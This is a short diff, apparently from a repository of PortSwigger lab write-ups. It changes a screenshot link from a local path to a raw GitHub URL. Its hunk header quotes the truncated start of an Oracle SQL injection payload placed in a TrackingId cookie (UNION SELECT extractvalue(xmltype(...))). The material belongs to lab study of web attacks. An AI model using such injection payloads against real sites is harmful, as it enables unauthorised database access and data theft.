@@ -8,5 +8,5 @@ TrackingId=wSR0EMmzIveEzi7k'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%
 
 
 
-![](images/9AEADE67B2494A78B48B05D38A4A66D6clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/SQL/images/9AEADE67B2494A78B48B05D38A4A66D6clipboard.png)
 
